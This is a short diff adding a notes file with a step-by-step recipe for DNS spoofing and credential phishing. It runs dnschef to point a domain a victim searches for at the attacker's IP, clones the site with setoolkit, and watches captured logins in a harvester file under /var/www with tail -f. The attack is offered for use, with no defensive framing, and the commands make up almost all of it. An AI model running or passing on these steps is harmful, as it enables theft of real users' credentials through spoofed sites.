@@ -1,0 +1,14 @@
+1) :::in terminal:::
+          dnschef --fakeip=192.168.1.102 --fakedomains=website-name-that-user-searches --interface=192.168.1.102
+
+//fakeip can be vpn or no ip account if you are doing over internet 
+//interface is always local ip
+
+2) now you can use the setoolkit to clone a website
+
+3) harvester in ::: cd /var/www
+
+4) to see lice updates fro harvester:::::
+    ::in terminal::
+               tail -f harvester
+    
